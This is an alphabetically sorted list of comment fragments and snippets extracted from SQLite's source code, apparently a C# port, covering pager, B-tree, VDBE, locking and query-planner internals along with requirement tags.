 True for B-Tree vs. pseudo-table or vtab 
 True for DESC.  False for ASC. 
 True for DESCENDING sort order 
 True for a freelist.  False for overflow page list 
 True for a read-only database 
 True for a savepoint rollback 
 True for a write lock 
 True for main rollback journal. False for Stmt jrnl 
 True for one-pass algorithm without the FIFO 
 True for read-only statements 
 True for temp files (incl. in-memory files) 
 True for write lock.  False for a read lock 
 True if EXPLAIN present on SQL command 
 True if I/O errors persist 
 True if REPLACE is used to resolve INT PK conflict 
 True if RHS must be unique 
 True if a '-' sign preceded <value> 
 True if a journal file is present 
 True if a m-j name has been written to jrnl 
 True if a table requiring integer keys 
 True if a transaction is opened 
 True if aggregates are seen 
 True if all indices need to be opened 
 True if all rows are being deleted 
 True if an fsync() is needed on the journal 
 True if an index containing keys only - no data 
 True if any page has PGHDR_NEED_SYNC 
 True if attempting to delete from a view 
 True if attempting to insert into a view 
 True if auto-vacuum is enabled 
 True if azVar[] has been initialized 
 True if callback data is initialized 
 True if constraint checking is deferred till COMMIT 
 True if db currently has pBt locked 
 True if dealing with an OUTER join 
 True if decimal point should be shown 
 True if errors are benign 
 True if field width constant starts with zero 
 True if for internal use only 
 True if header of journal is synced 
 True if iRoot is the root of an index b-tree 
 True if in a transaction 
 True if inMultiplier is an estimate 
 True if incr-vacuum is enabled 
 True if info.nKey is valid 
 True if initialized 
 True if inside sqlite3_declare_vtab() 
 True if integer overflow seen 
 True if is an aggregate function 
 True if is automatically created (ex: by UNIQUE) 
 True if lastRowid is valid 
 True if looking for a VIEW rather than a TABLE 
 True if no such function exists 
 True if non-integer value was input to the sum 
 True if outer SELECT uses aggregate functions 
 True if output is already ordered 
 True if p is a compound select 
 True if pDest has a UNIQUE index 
 True if pEntry is sorted 
 True if pPage is a leaf of a LEAFDATA tree 
 True if pParent is a root-page 
 True if pStart obtained from sqlite3_malloc() 
 True if pWriter has an EXCLUSIVE lock on the db 
 True if pages are on backing store 
 True if pointing to a row with no data 
 True if pointing to first entry 
 True if prepared with prepare_v2() 
 True if previously initialized. MUST BE FIRST! 
 True if prior affinity changes are OK 
 True if reading from unsynced main journal 
 True if recovering from error state 
 True if resolving names in a CHECK constraint 
 True if some process holds a RESERVED lock 
 True if sqlite3_interrupt has been called 
 True if src db requires unlocking 
 True if the AUTOINCREMENT keyword is present 
 True if the DISTINCT keyword is present 
 True if the EXPLAIN flag is found on the query 
 True if the EXPLAIN keywords is present 
 True if the NOT keyword is present 
 True if the TEMPORARY keyword is present 
 True if the VM needs to be recompiled 
 True if the conversion to IN is valid 
 True if the insert is likely to be an append 
 True if the only wildcard is % in the last character 
 True if the outermost savepoint is a TS 
 True if the page size can no longer be changed 
 True if the previous character was 'escape' 
 True if the record number is being changed 
 True if the rowid might collide with existing entry 
 True if the subquery uses aggregate functions 
 True if the underlying file is readonly 
 True if the value to convert is signed 
 True if there are any changes to the Db 
 True if there is a NOT INDEXED clause 
 True if there is a NOT NULL constraint 
 True if this column is 'hidden' 
 True if this column is part of the PRIMARY KEY 
 True if this constraint is usable 
 True if this cursor is an incr. io handle 
 True if this is a TEMP table 
 True if this is a VIEW 
 True if this is a VIRTUAL table 
 True if this is a read-only file 
 True if this is an in-memory file 
 True if this is likely an append 
 True if this is likely to be an append 
 True if this page stores data 
 True if this register has had an affinity change 
 True if this table should not be reordered 
 True if trailing zeros should be removed 
 True if u8key flag is set 
 True if uppercase is equivalent to lowercase 
 True if uses a statement journal 
 True if vacuuming a :memory: database 
 True if we acquired a PENDING lock this time 
 True if we are at the end of input 
 True if we can share pBt with another db 
 True if we have seen a malloc failure 
 True if we need to scan in reverse order 
 True if we use the index only 
 True if writable 
 True if wrong number of arguments 
 True if yymajor has invoked an error 
 True if zText is enlargeable using realloc 
 True if zeroed out and ready for reuse 
 True once a write-transaction is open on pDest 
 True once backup has been registered with pager 
 True to cause the name to be dequoted 
 True to copy SQL text into the sqlite3_stmt 
 True to dequote 
 True to enable core mutexing 
 True to enable full mutexing 
 True to enable memory status 
 True to enable tracing 
 True to force display of the exponent 
 True to inhibit all file I/O 
 True to omit read-lock 
 True to omit the xSync on the db file 
 True to reset page prior to first page rollback 
 True to save SQL text into the sqlite3_stmt 
 True to scan in reverse order 
 True to set the USESEEKRESULT flag on OP_[Idx]Insert 
 True to trace VDBE execution 
 True to update the change-counter 
 True to use in-memory sub-journals 
 True when first table is seen 
 True while initialization in progress 
 Truncate an open file to a specified size
 Truncate the file.
 Truncate the in-memory database file image to nPage pages. This
 Try 3 times to get the pending lock.  The pending lock might be
 Try to avoid a seek in BtreeInsert() 
 Try to convert a value into a numeric representation if we can
 Try to convert the type of a function argument or a result column
 Try to find a more efficient access pattern by using multiple indexes
 Try to find the next page in the overflow list using the
 Try to increase the size of the parser stack.
 Try to match the ORDER BY expression against an expression
 Try to obtain a lock of type locktype on the database file. If
 Try to obtain a page from the cache.
 Try to return memory used by the pcache module to the main memory heap 
 TryEnterCriticalSection(p.mutex) ){
 Trying to read or write past the end of the data is an error 
 Trying to update a view 
 Turn a SELECT statement (that the pSelect parameter points to) into
 Turn a relative pathname into a full pathname.  Write the full
 Turn bulk memory into a RowSet object.  N bytes of memory
 Turn bulk memory into a hash table object by initializing the
 Turn parser tracing on by giving a stream to which to write the trace
 Turn the pExpr expression into an alias for the iCol-th column of the
 Turn tracing on or off
 Two NULL values are considered equal by this function.
 Two UNIQUE or PRIMARY KEY constraints are considered equivalent
 Two or more AND-connected terms 
 Two or more OR-connected terms 
 Two routines for printing the content of an sqlite3_index_info
 Two versions of the official API.  Legacy and new use.  In the legacy
 Type
 Type code for object to destroy 
 Type conversions and pointer invalidations might occur
 Type entries can be between 1 and 5 bytes each.  But 4 and 5 byte
 Type field 
 Type of RHS table. IN_INDEX_
 Type of join between this able and the previous 
 Type of lock currently held on this file 
 Type of test to make on this file 
 Type of the container - used for error messages 
 Type values for all entries in the record 
 Typical code might look like this:
 UNION 
 UNIQUE 
 UNPACKED_IGNORE_ROWID
 UNPACKED_IGNORE_ROWID ) != 0 )
 UNPACKED_INCRKEY ) != 0 )
 UNPACKED_NEED_DESTROY
 UNPACKED_NEED_DESTROY ) != 0 )
 UNPACKED_NEED_FREE ) != 0 )
 UNPACKED_PREFIX_MATCH ) != 0 )
 UNPACKED_PREFIX_SEARCH ) != 0 
 UNUSED_PARAMETER( y )
 UPDATE 
 UPDATE and INSERT statements.
 USING 
 UTF-16 Big-endian -> UTF-8 
 UTF-16 Little-endian -> UTF-8 
 UTF-16 in the native byte order if sqlite3_open16() is used.
 UTF-16 string in native byte order.
 UTF-16 string.  The first parameter is the [prepared statement]
 UTF-8 -> UTF-16 Big-endian 
 UTF-8 -> UTF-16 Little-endian 
 UTF-8 encoded SQL statement. 
 UTF-8 file name 
 UTF-8 string.
 UTF-8.
 UTF-8.  Miscoded characters are removed.
 Unable to flatten compound queries 
 Unable to open the database file 
 Unaligned space available to hold the object 
 Unbind the value bound to variable i in virtual machine p. This is the
 Unbound parameters are interpreted as NULL.
 Uncommitted Hash table changes 
 Undo a readlock
 Undo the effects of sqlite3_initialize().  Must not be called while
 Undo the hack that converts floating point types to integer for
 Unlike memcmp() this routine is guaranteed to return the difference
 Unlink a VFS from the linked list
 Unlink the given table from the hash tables and the delete the
 Unlinking from the Table must be done by the calling function.
 Unlock notify callback 
 Unlock the database file. This function is a no-op if the pager
 Unlock-notify cb to invoke 
 UnlockFile().
 Unpacked index key 
 Unpacked version of key to compare against 
 Unprotected sqlite3_value objects may only be used with
 Unqualified name of the index to create 
 Unqualified name of the table to create 
 Unread parts of the buffer must be zero-filled 
 Unregister a VFS so that it is no longer accessible.
 Unregister a VFS with the sqlite3_vfs_unregister() interface.
 Unsigned loop counter 
 Unused space within the cell content area is collected into a linked list of
 Update any backup objects copying the contents of this pager. 
 Update the PCache1.pSynced variable if necessary. 
 Update the accumulator memory cells for an aggregate based on
 Update the aggregate accumulators based on the content of
 Update the assumed sector-size to match the value used by
 Update the count of rows that are inserted
 Update the database size and return.
 Update the db file change counter via the direct-write method. The
 Update the maximum rowid for an autoincrement calculation.
 Update the page-size to match the value read from the journal.
 Update the pointer-map and meta-data with the new root-page number. 
 Update the schema version field in the destination database. This
 Update the sqlite_sequence table by storing the content of the
 Update the state of the lock has held in the file descriptor then
 UpperToLower[
 UpperToLower[zLeft[a 
 UpperToLower[zLeft[a]] == UpperToLower[zRight[b]] ) ) ) { a
 UpperToLower[zLeft[a]] == UpperToLower[zRight[b]] ) { a
 Usable size of page 
 Usage:
 Use [sqlite3_clear_bindings()] to reset the bindings.
 Use a macro in all other compilers so that the function is inlined 
 Use a real function in MSVC to work around bugs in that compiler. 
 Use a rollback journal on this file 
 Use a testcase() macro to make sure that malloc failure within
 Use as many entries from the input list as required and update the
 Use for looping over pSrcList items 
 Use full fsync on the backend 
 Use index only - omit table 
 Use native byte order 
 Use pPager.journalOff as the effective size of the main rollback
 Use registers for speed 
 Use sqlite3EndTable() to add the view to the SQLITE_MASTER table 
 Use the [sqlite3_blob_bytes()] interface to determine the size of
 Use the ceiling() function to convert real->int 
 Use the content of register P3 as a integer key.  If a record
 Use the floor() function to convert real->int 
 Use the math library isnan() function if compiled with SQLITE_HAVE_ISNAN.
 Use the original text of the column expression as its name 
 Use the sqlite3VdbeResolveLabel() function to fix an address and
 Use the standard inner loop
 Use the two-part index name to determine the database
 Use this routine after name resolution.
 Use this routine to reset all host parameters to NULL.
 Use this text encoding 
 Use virtual-table processing 
 Use zTemp for any required temporary buffer space.
 Used by TK_AGG_COLUMN and TK_AGG_FUNCTION 
 Used by UNPACKED_PREFIX_SEARCH 
 Used during OR-clause processing 
 Used for moving information around in data[] 
 Used for rounding floating point values 
 Used for storing rowid values. 
 Used for testing and analysis only 
 Used internally 
 Used internally - xBestIndex should ignore 
 Used only when flags==MEM_Agg 
 Used only when flags==MEM_RowSet 
 Used reduced-size Expr nodes 
 Used to assert pCache->nPage is correct 
 Used to be pPager.nOvfl 
 Used to loop thru the element list 
 Used to move bytes around within data[] 
 Used to pass information from the analyzer reader through to the
 Used to store transient return codes 
 Used when C
 Used when bit MEM_Zero is set in flags 
 Used when p4type is P4_COLLSEQ 
 Used when p4type is P4_FUNCDEF 
 Used when p4type is P4_FUNCDEL 
 Used when p4type is P4_INT64 
 Used when p4type is P4_INTARRAY 
 Used when p4type is P4_KEYINFO 
 Used when p4type is P4_MEM 
 Used when p4type is P4_REAL 
 Used when p4type is P4_VDBEFUNC 
 Used when p4type is P4_VTAB 
 Used when plan.wsFlags
 User data parameter 
 Uses OS features not supported on host 
 Uses the OpenEphemeral opcode 
 Using this cache reduces the number of calls to btreeParseCell().
 Usually this is encoded in the same unicode encoding as the main
 Utility functions used throughout sqlite.
 VACUUM 
 VALUES 
 VDBE Cursor number of pTab 
 VDBE VdbeCursor associated with this ExprList 
 VDBE VdbeCursor number for pTab 
 VDBE cursor for the right table 
 VDBE cursor number of the pSub result set temp table 
 VDBE has completed execution 
 VDBE instances.  This file is solely interested in executing
 VDBE instruction address of the start of the loop 
 VDBE is ready to execute 
 VDBE program and resets the pParse structure for the next
 VDBE should have already been allocated 
 VDBE under construction 
 VDBE under constrution 
 VDBE.
 VDBE.  Return the address of the new instruction.
 VDBE.  This information used to all be at the top of the single
 VDBE_MAGIC_INIT.
 VDBE_MAGIC_RUN.
 VDBE_PROFILE 
 VDbeParsedRecord structure if it is large enough.  If it is
 VERIFY: F13021 
 VFS flags returned by xOpen() 
 VFS flags to open journal file 
 VFS implementations to directly control an open file using the
 VFS methods.
 VFS multiple times.  The new VFS becomes the default if makeDflt is
 VFS only 
 VIEW 
 VIRTUAL 
 Vacuum the entire database.  This opcode will cause other virtual
 Valid sqlite3_blob
 Valid values for the second argument to sqlite3PagerJournalMode().
 Valid values for the second argument to sqlite3PagerLockingMode().
 Value being transferred 
 Value for real types 
 Value for wsFlags returned by bestIndex() and stored in
 Value is NULL 
 Value is a BLOB 
 Value is a RowSet object 
 Value is a real number 
 Value is a string 
 Value is an integer 
 Value of P1 operand 
 Value of each argument 
 Value of k is out of range.  Database corruption 
 Value of pPage.aData[0] 
 Value of the next token 
 Value returned by authorization callback 
 Value returned by sqlite3OsAccess() 
 Value returned by sqlite3_changes() 
 Value returned by sqlite3_total_changes() 
 Value to be set 
 Value to return 
 Value to return from this function 
 Value to return in pnEntry 
 Value to return via 
 Values 
 Values  between 268435456 and 34359738367 
 Values between 0 and 127 
 Values between 128 and 16383 
 Values between 16384 and 2097151 
 Values between 2097152 and 268435455 
 Values computed by this block:
 Values for the OP_Variable opcode. 
 Values of cookies to verify 
 Variable 'dist' stores the number of tokens read since the most
 Variable iNextHdrOffset is set to the offset at which this
 Variable length integers are used for rowids and to hold the number of
 Variable pMaxFuncArgs is set to the maximum value of any P2 argument
 Variable tname now contains the token that is the old table-name
 Variable to copy from 
 Variables in which to record status information.
 Variables related to SQLITE_CONFIG_PAGECACHE settings. 
 Various SF_
 Various flags.  EP_
 Various register numbers 
 Various scripts scan this source file in order to generate HTML
 Vdbe being configured 
 Vdbe pTmp = new Vdbe()
 VdbeCursor for the NEW pseudo-table 
 VdbeCursor for the OLD table of AFTER triggers 
 VdbeCursor number assigned to the table 
 VdbeCursor number for ephemerial table 
 VdbeCursor number for the pIdx.pTable table 
 VdbeCursor number for the table 
 VdbeCursor number of the sorting index 
 VdbeCursor number of the source table 
 VdbeCursor number of the temporary table holding result 
 VdbeCursor pointing to the last entry 
 VdbeCursor row cache generation counter 
 VdbeCursor structure for the following reasons:
 VdbeCursor/BtCursor structures. The blob of memory associated with
 Verify correct alignment of TK_ and OP_ constants
 Verify property (1) 
 Verify property (2) 
 Verify that integers and floating point values use the same
 Verify that no more than one scratch allocation per thread
 Verify that the call to _bytes() does not invalidate the _text() pointer 
 Verify that the cursor holds a mutex on the BtShared
 Verify that the last entry really is an integer. 
 Verify that the number of pages on the list is N.
 Via the sqlite3_backup_XXX() API function backup_step() and
 View Name       NULL            
 View definition 
 ViewGetColumnNames() is a no-op if pTab is not a view (or virtual
 Virtual machine being coded 
 Virtual machine under construction 
 Virtual table implementations will typically add additional fields 
 Virtual table index to use 
 Virtual table of this cursor 
 Virtual tables can provide alternative implementations of functions
 Virtual tables cannot be used with a shared cache.  When shared
 Virtual tables methods can set an error message by assigning a
 Virtual tables must be handled separately 
 Virtual tables with open transactions 
 Visual Studio Version 16
 WARNING:  This routine might reallocate the space used to store
 WARNING: This macro is not compatible with the strcmp() family. It
 WHEN 
 WHEN clause 
 WHERE 
 WHERE clause during join processing but we need to remember that they
 WHERE clause of the UPDATE statement 
 WHERE clause term for OR-search 
 WHERE clause terms made redundant by the index range scan.
 WHERE clause.
 WHERE clause.  Mostly this is a container for one or more WhereTerms.
 WHERE rowid .. 
 WHERE rowid IN ( select ) 
 WHERE_
 WHERE_BTM_LIMIT )
 WHERE_BTM_LIMIT ) != 0 )
 WHERE_COLUMN_EQ ) ) != 0 )
 WHERE_COLUMN_IN )
 WHERE_COLUMN_NULL )
 WHERE_COLUMN_NULL ) ) == 0
 WHERE_COLUMN_NULL ) ) == 0 )
 WHERE_DUPLICATES_OK ) == 0 )
 WHERE_FORCE_TABLE )
 WHERE_FORCE_TABLE ) == 0 ) 
 WHERE_IDX_ONLY ) != 0
 WHERE_IDX_ONLY ) != 0 
 WHERE_IDX_ONLY ) != 0 )
 WHERE_IDX_ONLY ) == 0
 WHERE_IDX_ONLY ) == 0 )
 WHERE_INDEXED ) != 0 
 WHERE_INDEXED ) != 0 )
 WHERE_INDEXED ) != 0 )///
 WHERE_INDEXED ) == 0 )
 WHERE_IN_ABLE ) != 0 
 WHERE_IN_ABLE ) != 0 )
 WHERE_MULTI_OR ) != 0 )
 WHERE_OMIT_CLOSE 
 WHERE_OMIT_CLOSE ) == 0 )
 WHERE_OMIT_OPEN ) == 0 )
 WHERE_ONEPASS_DESIRED ) != 0 
 WHERE_ONEPASS_DESIRED ) == 0 
 WHERE_ORDERBY ) != 0 )
 WHERE_ORDERBY_MIN ) != 0
 WHERE_REVERSE ) != 0 
 WHERE_ROWID_EQ )
 WHERE_ROWID_EQ ) != 0 )
 WHERE_ROWID_RANGE
 WHERE_ROWID_RANGE )
 WHERE_ROWID_RANGE ) != 0 )
 WHERE_ROWID_RANGE ) ) != 0 )
 WHERE_TOP_LIMIT )
 WHERE_TOP_LIMIT ) != 0 )
 WHERE_TOP_LIMIT ) ) != 0 )
 WHERE_UNIQUE
 WHERE_UNIQUE ) != 0 
 WHERE_UNIQUE ) != 0 )
 WHERE_VIRTUALTABLE ) != null )
 WHERE_VIRTUALTABLE)!=null ){
 WO_EQ ) != 0 )
 WO_GE ) != 0 )
 WO_GE ) ) != 0 ) 
 WO_GT 
 WO_IN
 WO_IN 
 WO_IN )
 WO_IN ) != 0 )
 WO_IN ) ) == 0 )
 WO_ISNULL
 WO_ISNULL )
 WO_ISNULL ) != 0 )
 WO_LE 
 WO_LE ) != 0 )
 WO_LT 
 WO_SINGLE ) == 0 )
 WRC_Abort
 WRC_Abort : WRC_Continue
 WRC_Abort : WRC_Prune
 WRC_Abort or WRC_Continue
 WRITE_LOCK.
 Wait a little before trying again 
 Waiting connection 
 Walk all expressions associated with SELECT statement p.  Do
 Walk an expression tree.  Invoke the callback once for each node
 Walk an expression tree.  Return 1 if the expression is constant
 Walk the parse trees associated with all subqueries in the
 Walker.xSelectCallback is set to do something useful for every
 Want a pending lock
 Want a read-only lock
 Want a reserved lock
 Want to do one-pass UPDATE/DELETE 
 Wanting an exclusive lock
 Warning:  changing the way overflow payload is distributed in any
 We admit that this is a goofy design.  The problem has been fixed
 We are forced to roll back the active transaction. Before doing
 We assume a query of the following form:
 We can only reach this point when reading a corrupt database
 We can reuse a temporary table generated by a SELECT to our
 We cannot be in random rowid mode if this is
 We cannot use LockFileEx() or UnlockFileEx() on Win95/98/ME because
 We do not allow blobs with a prefix and a zero-filled tail. 
 We failed long ago if this is not so 
 We got the time 
 We have a match. Do not delete the master journal file. 
 We have found a candidate table and column.  Check to see if that
 We have successfully halted and closed the VM.  Record this fact. 
 We look at every expression in the outer query and every place we see
 We must continue looping until all tables and indices with
 We need to define _XOPEN_SOURCE as follows in order to enable
 We need to get the full path name of the file
 We need to prevent a random number of 0x8000000000000000
 We only need to generate a select expression if there
 We reach here if the named table is a really a view 
 We return -1000000 instead of the more usual -1 simply because using
 We should already hold a lock on the database connection 
 We should never write to the journal file the page that
 We support that for legacy
 We want to minimize len in order to limit the size of the memory
 We want to shift the pointer pSpace up such that it is 8-byte aligned.
 We will have to generate an ephemeral table to do the job.
 We will need to create our own temporary table to hold the
 Were we to proceed and prepare the statement against the uncommitted
 What follows is a massive switch statement where each case implements a
 What operation to perform 
 What to do in case of uniqueness conflict on iPKey 
 What to do with a uniqueness conflict 
 What to do with query results 
 What to do with the query results 
 When SQLite invokes the xSync() method of an
 When a connection (known as the blocked connection) fails to obtain a
 When a term is of the form:
 When an in-memory Table object is deleted (for example when the
 When an sqlite3_prepare() operation is required to access the virtual
 When back is being initialized 
 When built for other platforms (using the [SQLITE_OS_OTHER=1] compile-time
 When converting from UTF-8 to UTF-16 the maximum growth is caused
 When doing coverage testing ALWAYS and NEVER are hard-coded to
 When level of the FROM clause we are working on 
 When pSavepoint is not NULL (meaning a non-transaction savepoint is
 When the SQLITE_IOCAP_SAFE_APPEND flag is set. This guarantees
 When the pager is in no-sync mode. Corruption can follow a
 When this is called the journal file for pager pPager must be open.
 When this routine is the Walker.xExprCallback then expression trees
 When this routine was originally written it dealt with only
 Where clause to locate temp triggers 
 Where the SELECT... clause is as specified by the parameter to this
 Where to jump to continue with the next IN case 
 Where to send the data 
 Where to write new cell content in data[] 
 Where to write results 
 Where to write the extracted value 
 WhereLevel.wsFlags.  These flags determine which search
 WhereTerms.  All pointers to WhereTerms should be invalidated after
 Whether or not a new page may be allocated by this function depends on
 Whether this is an 'x IN(SELECT...)' or an 'x IN(<exprlist>)'
 Which action to take is determined by the overrideError parameter.
 Which columns are used by this index.  1st is 0 
 Which entry in pAggInfo->aCol[] or ->aFunc[] 
 Which entry in the FROM clause 
 Which level of pWInfo.a[] should be coded 
 Which nested loop of the FROM we are coding 
 Which parts of FROM have not yet been coded 
 Which tables are currently available 
 White space is ignored 
 Whitespace never causes a state transition and is always ignored.
 Whole days 
 Why is the db size invalidated here
 Why not just use a library random generator like lrand48() for this
 Width of the current field 
 Wildcard characters 
 Will become the return value of this function 
 WinCE lacks native support for file locking so we have to fake it
 WinNT reader will lock out all other Win95 readers.
 WinNT/2K/XP so that we will know whether or not we can safely call
 Windows VFS uses native malloc() and free() for some operations.
 WindowsCE does not have a localtime() function.  So create a
 With the [...] and [
 Work around bug in Borland C. Ticket 
 Wrapper around the pluggable caches xUnpin method. If the cache is
 Write VDBE code to erase table pTab and all associated indices on disk.
 Write a 32-bit integer into a string buffer in big-endian byte order.
 Write a 32-bit integer into the given file descriptor.  Return SQLITE_OK
 Write a 64-bit variable-length integer to memory starting at p[0].
 Write a NULL into register P2.
 Write a nice string representation of the contents of cell pMem
 Write a pointer to the next unread byte back into pzNext.
 Write a pointer to the page here 
 Write all dirty pages to the database file. 
 Write an entry into the pointer map.
 Write an entry into the table of cursor P1.  A new entry is
 Write an error message into pParse->zErrMsg that explains that the
 Write any error messages into pzErrMsg.  Return the result code.
 Write cell size here 
 Write code to erase the table with root-page iTable from database iDb.
 Write content into this buffer 
 Write current value here 
 Write data from a buffer into a file.  Return SQLITE_OK on success
 Write data to a blob handle.
 Write data to the file.
 Write error messages here 
 Write first byte past UTF-8 char here 
 Write head of the output list here 
 Write high-water mark here 
 Write into register P2 an integer which is the last entry in the record at
 Write into register P2 the complete row data for cursor P1.
 Write into register P2 the complete row key for cursor P1.
 Write meta-information back into the database.  Meta[0] is
 Write new cursor here 
 Write number of errors seen to this variable 
 Write out the page data. 
 Write search results here 
 Write tail of the output list here 
 Write temp register for right operand there 
 Write that value into register P2.
 Write the SQLite file handle here 
 Write the bytes into this buffer 
 Write the comparison result here 
 Write the content of register P3 (interpreted as an integer)
 Write the contents of the page out to the database file. 
 Write the current address onto register P1
 Write the current number of pages in database P1 to memory cell P2.
 Write the element into 
 Write the file descriptor here 
 Write the file descriptor into 
 Write the first journal header to the journal file and open
 Write the index of a new slot here 
 Write the master journal data to the end of the journal file. If
 Write the master journal name into the journal file. If a master
 Write the nRec Field - the number of page records that follow this
 Write the nRec value into the journal file header. If in
 Write the name of each database file in the transaction into the new
 Write the new column list here 
 Write the new expression node here 
 Write the new index key to this register 
 Write the new value here 
 Write the number of available bytes here 
 Write the number of columns here 
 Write the number of columns of result here 
 Write the number of error seen in pnErr.  Except for some memory
 Write the number of rows in the result here 
 Write the page here 
 Write the page pointer here 
 Write the record 
 Write the result here 
 Write the result into the DateTime structure and return 0
 Write the result table here 
 Write the sequence number into register P2.
 Write the serialized data blob for the value stored in pMem into
 Write the sorted results here 
 Write the specified cookie value 
 Write the supplied master journal name into the journal file for pager
 Write the unqualified object name here 
 Write transactions are not possible on a read-only database 
 Write up to nBuf bytes of randomness into zBuf.
 X (if it exists) is in pExpr.pLeft.
 X ]
 X is stored in pExpr.pLeft.
 X2 
 X==Ei (form A) or just Ei (form B) 
 XOR of index and ORDER BY sort direction 
 Y is in pExpr.pRight.  The Y is also optional.  If there is no
 Y is stored in pExpr.x.pList.a[0].pExpr.
 YYDEBUG 
 YYERRORSYMBOL is not defined 
 YYFALLBACK 
 YYMINORTYPE objects to zero. 
 YYNOERRORRECOVERY 
 YYNRULE 
 YYNRULE)
 YYWILDCARD
 YYWILDCARD 
 YY_SHIFT_USE_DFLT.
 Yes
 You can change this value at compile-time by specifying a
 Z is a string literal if it doesn't match any column names.  In that
 Z is stored in pExpr.x.pList.a[1].pExpr.
 Zero is returned if a malloc() fails.
 Zero pad 
 Zero the contents of pRoot. Then install pChild as the right-child. 
 Zero the newly allocated slots 
 Zero the rowset in reg 1
 Zeroblobs are intended to serve as placeholders for BLOBs whose
 [CREATE TRIGGER 
 [GLOB] operators.</dd>
 [H11203] [H11206] [H11209] [H11212] [H11215] [H11218]
 [H11302] [H11304]
 [H12011] [H12012] [H12013] [H12014] [H12015] [H12019]
 [H12101] [H12102] [H12104] [H12105] [H12107] [H12110] [H12113] [H12116]
 [H12119] [H12122] [H12125] [H12131] [H12134] [H12137] [H12138]
 [H12201] [H12202]
 [H12221] [H12223]
 [H12241] [H12243]
 [H12261] [H12263]
 [H12271] [H12272]
 [H12281] [H12282] [H12283] [H12284] [H12285] [H12287] [H12288] [H12289]
 [H12290]
 [H12311] [H12312] [H12314] [H12316] [H12318]
 [H12341] [H12343] [H12344]
 [H12371] [H12373] [H12374] [H12376] [H12379] [H12382]
 [H12501] [H12502] [H12503] [H12504] [H12505] [H12506] [H12507] [H12510]
 [H12511] [H12512] [H12520] [H12521] [H12522]
 [H12551] [H12552] [H12553] [H12554]
 [H12701] [H12702] [H12703] [H12704] [H12706] [H12707] [H12709] [H12711]
 [H12712] [H12713] [H12714] [H12717] [H12719] [H12721] [H12723]
 [H12762] [H12766] [H12769]
 [H12801] [H12802] [H12803] [H12807] [H12808] [H12809]
 [H12911] [H12912] [H12913] [H12914] [H12915] [H12916] [H12917] [H12918]
 [H12951] [H12952] [H12953] [H12954] [H12955]
 [H12961] [H12962] [H12963] [H12964]
 [H12971] [H12973] [H12975] [H12977] [H12979] [H12981] [H12983] [H12986]
 [H13011] [H13012] [H13013] [H13014] [H13015] [H13016] [H13019] [H13021]
 [H13101] [H13102] [H13103]
 [H13202] [H15304] [H15306] [H15308] [H15310]
 [H13506] [H13509] [H13512] [H13515] [H13518] [H13521] [H13524] [H13527]
 [H13530] [H13533] [H13536] [H13539] [H13542] [H13545] [H13548] [H13551]
 [H13601]
 [H13621]
 [H13641]
 [H13661]
 [H13711]
 [H13721] [H13723] [H13724] [H13725] [H13726] [H13727]
 [H13741] [H13742] [H13743] [H13744] [H13745] [H13746] [H13748]
 [H13761] [H13762] [H13763]
 [H13771] [H13772]
 [H13803] [H13806] [H13809] [H13812] [H13815] [H13818] [H13821] [H13824]
 [H13827] [H13830]
 [H14103] [H14106] [H14120] [H14123] [H14126] [H14129] [H14132] [H14135]
 [H14138] [H14141] [H14144] [H14147] [H14150] [H14153] [H14156] [H14159]
 [H14162] [H14165] [H14168]
 [H14203] [H14206] [H14209] [H14212] [H14215]
 [H15103] [H15106] [H15109] [H15112] [H15115] [H15118] [H15121] [H15124]
 [H15127] [H15130] [H15133] [H15136]
 [H16103] [H16106] [H16109] [H16112] [H16118] [H16121] [H16127]
 [H16130] [H16133] [H16136] [H16139] [H16142]
 [H16211] [H16213] [H16215] [H16217]
 [H16243]
 [H16253]
 [H16272] [H16274] [H16276] [H16277] [H16278] [H16279]
 [H16351] [H16352] [H16353] [H16354] [H16355] [H16358]
 [H16403] [H16406] [H16409] [H16412] [H16415] [H16418] [H16421] [H16424]
 [H16427] [H16430] [H16433] [H16436] [H16439] [H16442] [H16445] [H16448]
 [H16451] [H16454] [H16457] [H16460] [H16463]
 [H16603] [H16604] [H16606] [H16609] [H16612] [H16615] [H16618] [H16621]
 [H16624] [H16627] [H16630]
 [H16702] [H16704] [H16706]
 [H17303] [H17304] [H17305] [H17306] [H17310] [H17312] [H17315] [H17318]
 [H17321] [H17322] [H17323]
 [H17371] [H17373] [H17374] [H17375]
 [H17392]
 [H17403] [H17406] [H17407]
 [H17813] [H17814] [H17816] [H17819] [H17821] [H17824]
 [H17833] [H17836] [H17839]
 [H17843]
 [H17853] [H17856] [H17859] [H17862] [H17863] [H17865] [H17868]
 [H17873] [H17874] [H17875] [H17876] [H17877] [H17879] [H17882] [H17885]
 [H17888]
 [H33020].
 [ON CONFLICT 
 [SQL parameter] in a [prepared statement].
 [SQLITE_BUSY] is returned to the caller. In this case the call to
 [SQLITE_BUSY] means that the database engine was unable to acquire the
 [SQLITE_BUSY] or [SQLITE_IOERR_BLOCKED].
 [SQLITE_CONFIG_MALLOC].  By creating an instance of this object
 [SQLITE_CONFIG_MUTEX] option of the sqlite3_config() function
 [SQLITE_CONFIG_PAGECACHE]) and allocations that overflowed because
 [SQLITE_CONFIG_PAGECACHE].  The
 [SQLITE_CONFIG_SINGLETHREAD 
 [SQLITE_CONFIG_SINGLETHREAD] or [SQLITE_CONFIG_MULTITHREAD]
 [SQLITE_DONE] means that the statement has finished executing
 [SQLITE_ENABLE_COLUMN_METADATA] C-preprocessor symbol defined.
 [SQLITE_ENABLE_UNLOCK_NOTIFY] C-preprocessor symbol defined.
 [SQLITE_ERROR] is returned and no data is read.  If N or iOffset is
 [SQLITE_ERROR] is returned and no data is written.  If N is
 [SQLITE_ERROR] means that a run-time error (such as a constraint
 [SQLITE_IGNORE] then the [DELETE] operation proceeds but the
 [SQLITE_INTEGER 
 [SQLITE_IOERR] rather than [SQLITE_NOMEM].
 [SQLITE_IOERR_ACCESS 
 [SQLITE_MISUSE] means that the this routine was called inappropriately.
 [SQLITE_MISUSE] might be returned if these routines are called on a
 [SQLITE_NOMEM].
 [SQLITE_OK 
 [SQLITE_OK] is returned.  Otherwise an [error code] is returned.  The
 [SQLITE_OPEN_CREATE]. 
 [SQLITE_OPEN_CREATE]</dt>
 [SQLITE_OPEN_FULLMUTEX] flag is set then the database connection opens
 [SQLITE_OPEN_NOMUTEX] or [SQLITE_OPEN_FULLMUTEX] flags:
 [SQLITE_OPEN_READWRITE] 
 [SQLITE_STMTSTATUS_SORT 
 [SQLITE_SYNC_FULL].  The first choice is the normal fsync().
 [SQLITE_THREADSAFE=1]) the SQLite library will itself serialize access
 [SQLITE_UTF8 
 [SQLITE_VERSION_NUMBER].
 [SQLite Shared-Cache Mode] for a description of shared-cache locking. 
